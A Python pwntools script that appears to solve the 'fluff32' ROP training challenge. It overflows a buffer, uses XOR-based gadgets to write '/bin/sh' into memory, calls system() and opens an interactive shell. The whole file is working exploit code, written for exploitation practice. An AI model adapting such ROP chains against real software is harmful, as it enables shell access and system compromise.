#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('fluff32')
system_plt = elf.symbols['system']

# ROP Gadgets
gadget1 = 0x08048693
gadget2 = 0x080483e1
gadget3 = 0x0804867b
gadget4 = 0x08048689

# buffer
buf = 0x0804a028

# xor shit
xor_key = 0xdefaced0


if __name__ == '__main__':
    proc = elf.process()


    payload = 11 * b'AAAA'


    # begin: set ecx <- buf
    payload += p32(gadget4)
    payload += b'AAAA'

    payload += p32(gadget2)
    payload += p32(buf ^ xor_key)

    payload += p32(gadget3)
    payload += b'AAAA'
    # end


    # begin: write "/bin" to buf
    payload += p32(gadget4)
    payload += b'AAAA'

    payload += p32(gadget2)
    payload += p32((0x6e69622f ^ xor_key) & 0xffffff00 | 0x2f ^ 0xd0 ^ 0xd0)  # 2f got xor'ed with d0 twice

    payload += p32(gadget3)
    payload += b'AAAA'

    payload += p32(gadget1)
    payload += b'AAAA'
    payload += p32(xor_key)
    # end


    # begin: set ecx <- (buf + 4)
    payload += p32(gadget4)
    payload += b'AAAA'

    payload += p32(gadget2)
    payload += p32((buf + 4) ^ xor_key)

    payload += p32(gadget3)
    payload += b'AAAA'
    # end


    # begin: write "/sh\x00" to (buf + 4)
    payload += p32(gadget4)
    payload += b'AAAA'

    payload += p32(gadget2)
    payload += p32((0x0068732f ^ xor_key) & 0xffffff00 | 0x2f ^ 0xd0 ^ 0xd0)  # 2f got xor'ed with d0 twice

    payload += p32(gadget3)
    payload += b'AAAA'

    payload += p32(gadget1)
    payload += b'AAAA'
    payload += p32(xor_key)
    # end


    # system(buf)
    payload += p32(system_plt) + b'AAAA' + p32(buf)


    proc.recvuntil('> ')
    proc.sendline(payload)
    proc.interactive()
